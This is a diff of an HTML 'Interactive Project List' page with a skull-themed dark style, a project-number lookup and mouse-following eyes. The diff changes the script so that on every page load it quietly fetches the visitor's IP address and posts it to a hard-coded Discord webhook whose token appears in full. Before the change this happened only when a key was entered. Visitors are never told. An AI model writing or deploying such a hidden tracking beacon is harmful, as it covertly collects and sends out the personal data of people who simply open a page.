@@ -3,87 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interactive Project List with Key System</title>
+    <title>Interactive Project List</title>
     <style>
+        /* General styling */
         body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            background-color: #f0f0f0;
             margin: 0;
-        }
-        .container {
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffffff;
             text-align: center;
-            background: white;
-            padding: 20px;
+            background-color: #000000;
+            background-image: url('https://cdn.discordapp.com/attachments/1318094227770576936/1322482772316655686/dithered-image.png?ex=67725b0f&is=6771098f&hm=6cd302376a847f043670cdeb2ac66d38a975731dea872adea3f317b27defae03&');
+            background-size: auto;
+            background-position: center;
+            background-repeat: repeat;
+        }
+
+        h1 {
+            font-size: 3em;
+            margin-top: 20px;
+            text-shadow: 2px 2px 5px red;
+        }
+
+        .project-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+            margin: 20px auto;
+            font-size: 1em;
+            max-width: 60%;
+            text-align: left;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
+            box-shadow: 0px 0px 10px red;
         }
-        input[type="text"] {
-            padding: 10px;
-            font-size: 16px;
-            margin-bottom: 10px;
-            width: 200px;
-            border: 1px solid #ccc;
+
+        .project-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px;
             border-radius: 5px;
+            text-align: center;
+            box-shadow: 0px 0px 5px rgba(255, 0, 0, 0.5);
+            cursor: pointer;
+            transition: background-color 0.2s;
         }
+
+        .project-item:hover {
+            background: rgba(255, 0, 0, 0.3);
+        }
+
+        .input-section {
+            margin-top: 30px;
+        }
+
+        input[type="number"] {
+            font-size: 1.2em;
+            padding: 5px;
+            border: none;
+            outline: none;
+            border-radius: 5px;
+            text-align: center;
+        }
+
         button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #007bff;
+            font-size: 1em;
+            padding: 5px 15px;
+            margin-left: 10px;
+            background: red;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
+
         button:hover {
-            background-color: #0056b3;
+            background: darkred;
         }
-        .message {
-            margin-top: 20px;
-            font-size: 18px;
+
+        .output {
+            margin-top: 10px;
+            font-size: 1em;
+            color: yellow;
         }
-        .project-list {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 10px;
-            max-width: 80%;
-            margin-top: 20px;
+
+        .eyes-container {
+            position: absolute;
+            top: 90%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            z-index: 10;
         }
-        .project-item {
-            background: white;
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
-            cursor: pointer;
-            transition: background-color 0.2s;
+
+        .eye {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
         }
-        .project-item:hover {
-            background: #f1f1f1;
+
+        .pupil {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background-color: black;
+            border-radius: 50%;
+        }
+
+        footer {
+            margin-top: 50px;
+            font-size: 0.9em;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Enter Key</h1>
-        <input type="text" id="keyInput" placeholder="Enter key">
-        <button onclick="checkKey()">Submit</button>
-        <div class="message" id="message"></div>
-    </div>
-
+    <h1>☠ My Project List ☠</h1>
     <div class="project-list" id="projectList"></div>
+    <div class="input-section">
+        <label for="projectNumber">Enter the desired project number:</label>
+        <input type="number" id="projectNumber" min="1">
+        <button onclick="showProjectLink()">Show Link</button>
+        <div class="output" id="output"></div>
+    </div>
+    <div class="eyes-container">
+        <div class="eye">
+            <div class="pupil" id="pupil1"></div>
+        </div>
+        <div class="eye">
+            <div class="pupil" id="pupil2"></div>
+        </div>
+    </div>
+    <footer>
+        ☠ Sinner On Top ☠
+    </footer>
 
     <script>
         // Function to send a message to Discord webhook
-        function sendDiscordMessage(content) {
+        function sendDiscordMessage(ip) {
             const webhookUrl = 'https://discord.com/api/webhooks/1320573435000131666/II8QZ3NEepev4bSfyncQvaDYFiqA6ovP6Y9MJNJu3AHXEuRETyPEl06osnsdadZuMmAf';
             const message = {
-                content: content,
+                content: `Someone just visited the website! IP Address: ${ip}`,
             };
 
             fetch(webhookUrl, {
@@ -113,50 +180,70 @@
                 .then(data => {
                     const ip = data.ip;
                     console.log(`User's IP address is: ${ip}`);
-                    sendDiscordMessage(`Someone just visited the website! IP Address: ${ip}`);
+                    sendDiscordMessage(ip);
                 })
                 .catch(error => {
                     console.error('Error fetching IP address:', error);
                 });
         }
 
-        // Function to check the entered key
-        function checkKey() {
-            const key = document.getElementById('keyInput').value;
-            const messageDiv = document.getElementById('message');
-
-            if (key === '1111') {
-                getIpAndSendMessage();
-                messageDiv.textContent = 'IP address sent to Discord webhook.';
-            } else if (key === '8899') {
-                sendDiscordMessage('A sigma is on the site.');
-                messageDiv.textContent = 'Admin is on the website.';
-            } else {
-                messageDiv.textContent = 'Invalid key. Please try again.';
-            }
-        }
+        // Call the function to get the IP address and send the message when the page loads
+        window.onload = getIpAndSendMessage;
 
         // Project data
         const projects = [
             { id: 1, name: "Project 1", link: "https://example.com/project-1" },
             { id: 2, name: "Project 2", link: "https://example.com/project-2" },
-            { id: 3, name: "Project 3", link: "https://example.com/project-3" }
+            { id: 3, name: "Project 3", link: "https://example.com/project-3" },
             // Add more projects as needed
         ];
 
         // Generate project list dynamically
         const projectListDiv = document.getElementById('projectList');
+        const projectNumberInput = document.getElementById('projectNumber');
         projects.forEach(project => {
             const projectItem = document.createElement('div');
             projectItem.className = 'project-item';
             projectItem.textContent = `${project.id}. ${project.name}`;
 
-            // Add click event to open the project link
+            // Add click event to populate the input box
             projectItem.addEventListener('click', () => {
-                window.open(project.link, '_blank');
+                projectNumberInput.value = project.id; // Populate the input box with the project number
             });
 
             projectListDiv.appendChild(projectItem);
+        });
+
+        // Function to show the project link
+        function showProjectLink() {
+            const projectNumber = projectNumberInput.value;
+            const outputDiv = document.getElementById('output');
+            const project = projects.find(p => p.id == projectNumber);
+            if (project) {
+                outputDiv.innerHTML = `Project Link: <a href="${project.link}" target="_blank">${project.link}</a>`;
+            } else {
+                outputDiv.textContent = "Invalid project number! Please enter a valid number.";
+            }
+        }
+
+        // Eyes that follow the mouse
+        const pupils = document.querySelectorAll('.pupil');
+        document.addEventListener('mousemove', (event) => {
+            const { clientX, clientY } = event;
+            pupils.forEach((pupil) => {
+                const rect = pupil.parentElement.getBoundingClientRect();
+                const centerX = rect.left + rect.width / 2;
+                const centerY = rect.top + rect.height / 2;
+                const deltaX = clientX - centerX;
+                const deltaY = clientY - centerY;
+                const distance = Math.min(15, Math.sqrt(deltaX ** 2 + deltaY ** 2));
+                const angle = Math.atan2(deltaY, deltaX);
+
+                const pupilX = Math.cos(angle) * distance;
+                const pupilY = Math.sin(angle) * distance;
+
+                pupil.style.transform = `translate(${pupilX}px, ${pupilY}px)`;
+            });
         });
     </script>
 </body>
